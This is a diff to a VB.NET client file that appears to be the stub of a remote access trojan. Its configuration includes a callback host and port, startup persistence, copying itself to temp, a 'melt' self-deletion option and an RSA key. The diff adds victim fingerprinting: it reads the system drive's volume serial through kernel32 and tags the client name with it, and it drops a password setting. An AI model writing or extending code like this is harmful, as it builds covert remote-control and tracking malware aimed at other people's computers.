@@ -138,6 +138,7 @@ Public Class Main
     End Function
     Public Shared WTS_CURRENT_SERVER_HANDLE As IntPtr = IntPtr.Zero
     Public Shared WTS_CURRENT_SESSION As Integer = -1
+    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
 #End Region
 
     ''' <summary>
@@ -161,14 +162,13 @@ Public Class Main
         ''temporary preferences
         HOST = "127.0.0.1" ''IP
         port = 92 ''Port
-        name = "Wonder" ''Client Name
+        name = "Wonder" & "_" & HWD() ''Client Name
         copyse = False ''Copy (to temp)
         'serfol = alaa(5)
         sernam = "null" ''copy name (server name)
         addtos = False ''add to startup
         StartupKey = "null" ''startup key name
         melts = "False" ''melt
-        pw = "hinki" ''password
         pk = "<RSAKeyValue><Modulus>oQS+MurZhAp2kYh7VWeyMZrwYmmpW5GYW+WW2V74YZqobBYkD6gTnI0XfOL2NRtv46IgYPZvB7mWG7af+hAYkb+0uUu/8DGJ2VAV1AyEKAzrv0bzXk10n28npYuE5jBvACl1Im+LNG8lgcNZe8AkPa1eVN6HrziD8GDgF+Ib+XCnUcA3piFf3mleVvyK2svUO2dFb2rYJTLpnIRkHHlO9wSbHIT51hcMmy9mZIG/O2xR7smtKHwEDFDIUor6BhCiWM2BBcHPzQEcL7qBL1Tie9Kd8CAB2YMRybaEWvU1rS1WNf+CBN2eWNGd3H5GTn8enZjG5szr7C5UV8HYDRPUGrnTsfVUUVQKKnn+DR4RusegfsWLCuIhfKkrZZWDmhw/WWgZWiAvbNl51rsqD1Cr8ILcOTgaOztXSoC0NkVCzDiNIqqeSZ+LhT+ML8G3TLe0C2noYomBEcG2QogC462dgT7mTO0OYaUnhV9DTiU0pPj9bXYfotnL0sLPM/FXBTK3O41resBiEeOKi2qMHsIQCyNRY7PnuFeb/y7MMWv+QPpGlcZoiN6t8ntoIZlYSdmVaAy8qOVs0Vfh8ZICXjkvmv68JnSCCOezbjxMOCiVbTpxxcDKThom1Km6n3gBOhuZjd6QJeXZwnQBpsKRcFD0UxkzlltaMFPItu3RyhAI/90=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>" ''public key
 
         ConTimer = New Timers.Timer(5000) ''timer connection to client interval 5s
@@ -196,7 +196,6 @@ Public Class Main
         addtos = prfs(6) ''add to startup
         StartupKey = prfs(7) ''startup key name
         melts = prfs(8) ''melt
-        pw = prfs(9) ''password
         ConTimer = New Timers.Timer(5000) ''timer connection interval
 
         If Not IO.Directory.Exists(Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name) Then
@@ -307,6 +306,17 @@ Public Class Main
     Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
         End ''TODO remove
     End Sub
+
+
+    Function HWD() As String
+        Try
+            Dim sn As Integer
+            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
+            Return (Hex(sn))
+        Catch ex As Exception
+            Return "ERR"
+        End Try
+    End Function
 
 #Region "Socket Events"
     Private Sub Connected() Handles C.Connected
